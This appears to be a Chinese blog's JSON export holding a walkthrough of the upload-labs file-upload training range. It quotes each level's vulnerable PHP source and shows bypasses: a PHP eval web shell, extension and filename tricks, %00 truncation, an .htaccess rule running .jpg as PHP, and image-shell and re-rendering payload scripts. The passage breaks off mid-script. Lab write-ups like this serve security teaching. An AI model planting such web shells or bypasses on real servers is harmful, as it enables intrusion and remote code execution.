{"meta":{"title":"R4x's Blog","subtitle":"R4x's Blog","description":"道阻且长，行则将至","author":"R4x","url":"http://r4x.top","root":"/"},"pages":[{"title":"[404]","date":"2022-11-10T08:35:36.975Z","updated":"2022-11-10T08:35:36.975Z","comments":true,"path":"404.html","permalink":"http://r4x.top/404.html","excerpt":"","text":""},{"title":"Index.me","date":"2022-11-10T08:09:46.000Z","updated":"2022-11-10T08:44:15.822Z","comments":true,"path":"about/index.html","permalink":"http://r4x.top/about/index.html","excerpt":"","text":"Test"}],"posts":[{"title":"upload-labs 通关记录","slug":"upload-labs","date":"2022-11-26T16:00:00.000Z","updated":"2022-11-27T08:35:31.005Z","comments":true,"path":"2022/11/27/upload-labs/","link":"","permalink":"http://r4x.top/2022/11/27/upload-labs/","excerpt":"","text":"GitHub：https://github.com/c0ny1/upload-labs Pass-01-前端过滤进入Pass-01，只有一个上传入口，先上传一个php马看看： 1&lt;?php eval($_POST[shell]);?&gt; 发现不允许上传，查看前端源码：前端根据文件扩展名过滤，有三种方法可以绕过： 删除前端相关代码 先上传png，burp抓包修改 禁用js这里burp抓包修改上传：蚁剑连接：源码1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value; if (file == null || file == &quot;&quot;) &#123; alert(&quot;请选择要上传的文件!&quot;); return false; &#125; //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123; var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; &#125;&#125; 这一关只在前端使用文件扩展名白名单进行过滤，形同虚设Pass-02-后端MIME检查首先查看前端源码，发现没有前端的过滤，那直接传php文件先：看来是后端检查，查看提示后发现这关是检查文件的MIME MIME（Multipurpose Internet Mail Extensions）：媒体类型，是一种标准，用来表示文档、文件或字节流的性质和格式。 常见的一些MIME： 12345678910111213text/plaintext/htmlimage/jpegimage/pngaudio/mpegaudio/oggaudio/*video/mp4application/*application/jsonapplication/javascriptapplication/ecmascriptapplication/octet-stream 上传后抓包：修改为：上传成功：蚁剑连接： 源码12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;文件类型不正确，请重新上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 针对文件的MIME进行的白名单过滤，只允许png，jpg和gif Pass-03-后端扩展名过滤传一下看看情况：仍然是后端过滤，是在后端过滤了文件类型，查看源码： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 发现是根据黑名单过滤的，那可以通过修改扩展名绕过过滤： 12345php3php5phtmlphpspht 需要注意到的是，我这里是使用docker搭建的环境，需要先在/etc/apache2/conf-available/docker-php.conf这个配置对以上文件的解析，修改以下这样： 12345678910111213&lt;FilesMatch \\.php$&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;AddHandler application/x-httpd-php .php .php3 .php5 .phtmlDirectoryIndex disabledDirectoryIndex index.php index.html&lt;Directory /var/www/&gt; Options -Indexes AllowOverride All&lt;/Directory&gt; 修改完重启以下容器即可这里上传显示phpinfo的马，验证方便一些： 1&lt;?php phpinfo(); ?&gt; 直接访问刚刚上传的文件即可： Pass-04-htaccess绕过上传测试：好长的黑名单：这种情况可以上传.htaccess文件，该文件可以使Apache将jpg文件解析成php文件 .htaccess.htaccess文件是Apache下面的一个纯文本配置文件，主要是为了解决开发者在团队开发中难以直接修改Apache配置文件httpd.conf文件的问题，官方文档给出的介绍是： .htaccess文件（或“分布式配置文件”）提供了一种基于每个目录进行配置更改的方法。包含一个或多个配置指令的文件放置在特定的文档目录中，这些指令适用于该目录及其所有子目录。 其作用主要有以下几个：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止/允许特定IP/IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等要使它生效，docker环境下，需要在/etc/apache2/conf-available/docker-php.conf文件内配置这个选项： 1AllowOverride All 默认是配置好的，就不用再改了 回到主题，我们可以编写如下的.htaccess文件： 1AddType application/x-httpd-php .jpg 其作用是将jpg解析为php，先上传这个文件，再上传图片马执行成功 Pass-05-大写绕过测试：看一下，这关还过滤了htaccess文件：查看一下源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 过滤结束后会检查文件名是否在黑名单内，这里使用的函数是in_array()，这个函数是区分大小写的： 那大写绕过一下，然后，抓包修改：上传成功：访问图片地址即可： Pass-06-空格绕过1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 这一关在检查黑名单之前，先将文件名转换为小写，这样就不能用大写过滤了但是这里并没有首尾去空格，抓包加空格：成功绕过： Pass-07-点绕过这一关禁止上传了所有可以解析的扩展名 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 函数作用解析： trim()：移除字符串两侧的空白字符或其他预定义字符 strrchr()：查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符 注意到过滤时，会返回最后一个点出现的位置作为截断的位置，基于这样的过滤方式，就可以考虑构造下面的文件名： 11.php. 抓包修改： Pass-08-::$DATA绕过1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 与上一关相比，少了对::$DATA的过滤，::$DATA是windows的一个特性：如果文件名后面加上::$DATA，则windows会把::$DATA之后的内容当做文件流处理，且保持::$DATA之前的文件名利用::$DATA绕过后端的文件名检测之后，当服务器把xxx.php.::$DATA这样的文件返回到前端时，windows会自动将末尾的::$DATA去掉抓包修改：需要注意的是，这里只有在windows平台下才可以解析，我是docker运行的linux环境，所以并不会解析 Pass-09-点空格点绕过123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 这一关开始会去除字符::$DATA，分析过滤的流程，删除末尾的点–&gt;返回最后一个点的位置后的所有字符–&gt;转换为小写–&gt;去除::$DATA–&gt;首尾去空格，可以构造以下的文件名： 11.php. . 环境问题，无法顺利解析 Pass-10-扩展名双写绕过12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 这一关会直接将名单中的字符给去除掉，用到了str_ireplace()，这个函数的替换过程只执行一次，直接双写绕过即可： 11.phphpp Pass-11-%00绕过123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 这一关使用白名单限制文件类型，但是上传路径是可以控制的，原理是通过%00进行截断，%00是Ascii码值为0的字符的url编码形式，常用来截断url，条件是php中的参数magic_quotes_gpc为off，且php版本小于5.3抓包修改参数：访问上传路径： Pass-12-%00解码后绕过这一关的参数提交方式变为了POSTPOST请求下%00不会解码，我们可以在burp里面提前解码： 解码后如下，虽然看不到，但是是存在的：成功后访问即可 Pass-13-图片马这一关开始要求上传三种格式的图片马先制作图片马，windows下使用如下命令： 1copy .\\1.png /b + .\\11.php /a shell.png 需要注意的是，如果使用的是windows terminal会报错，可以命令cmd进入cmd再执行命令打开imhex查看：可以看到已经成功附加在了图片后面上传一下，成功：复制文件地址，在本关提供的文件包含漏洞页面包含进我们上传好的马：前面的乱码是图片的内容，这里php将图片包含进来当做代码去执行，然而在图片马之前的内容都是二进制的图像，所以包含进来显示乱码，直到遇到正确的php语句，显示出了phpinfo页面其他几种格式也很容易就可以传上去 Pass-14-图片马本关使用getimagesize()函数检查上传的是否是图片文件具体用法如下：getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。语法格式： 1array getimagesize ( string $filename [, array &amp;$imageinfo ] ) getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。本关源代码： 12345678910111213141516171819202122232425262728293031function isImage($filename)&#123; $types = &#x27;.jpeg|.png|.gif&#x27;; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext))&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $res = isImage($temp_file); if(!$res)&#123; $msg = &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;&#125; 这里我们上传的图片时可以获取到信息的，可以直接使用之前生成的图片马： Pass-15-图片马本关使用exif_imagetype()函数检查是否是图片文件，用法如下： 1exif_imagetype(string $filename): int exif_imagetype() 读取一个图像的第一个字节并检查其签名，如果发现了恰当的签名则返回一个对应的常量，否则返回 false。这个函数与getimagesize()的不同是： 通过调用exif_imagetype()函数判断图像类型的方法更具有容错性、能够对无法正常显示的图片马进行正常处理；而通过调用getimagesize()函数和image_type_to_extension()函数来获取图像类型并设置后缀名的方法是没办法对无法正常显示的图片马进行正常处理的。 使用之前生成的图片马即可通关 Pass-16-二次渲染绕过12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;]; $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $target_path=UPLOAD_PATH.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = &quot;该文件不是jpg格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; $newimagepath = UPLOAD_PATH.$newfilename; imagejpeg($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.$newfilename; @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = &quot;该文件不是png格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; $newimagepath = UPLOAD_PATH.$newfilename; imagepng($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.$newfilename; @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = &quot;该文件不是gif格式的图片！&quot;; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; $newimagepath = UPLOAD_PATH.$newfilename; imagegif($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.$newfilename; @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = &quot;上传出错！&quot;; &#125; &#125;else&#123; $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; &#125;&#125; 这一关重新渲染了图片，使用的函数是imagecreatefromjpeg()，该函数用法如下： 1imagecreatefromjpeg(string $filename): resource imagecreatefromjpeg() 返回一图像标识符，代表了从给定的文件名取得的图像 二次渲染绕过基本的思路是对比渲染前和渲染后图片之间的差异，找到非图片数据区里数据相同的地方，插入代码 GIFGIF只需要和源文件比较找出数据没有没修改的区域插入代码即可在imhex内对比，找到相同的部分，插入payload：上传： PNGPNG下原理相同，但是实现比较复杂，需要将数据写入到PLTE数据块或者IDAT数据块，涉及到图片存储的相关知识，我也不懂，直接使用大佬写的脚本： 1https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py 作者对原理分析写的文章如下： 1https://github.com/hxer/imagecreatefrom-/blob/master/png/analysis/README.md 需要注意的是，以以上原理插入链接的前提是图像模式要为索引模式，可以在ps内修改，同时作者提供的程序是python2版本的，可以使用anaconda创建一个虚拟环境运行，修改后可以看到文件头内插入了payload：上传：成功： JPGjpg可以使用以下程序生成图像： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168&lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;. If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&#x27;gd&#x27;) || 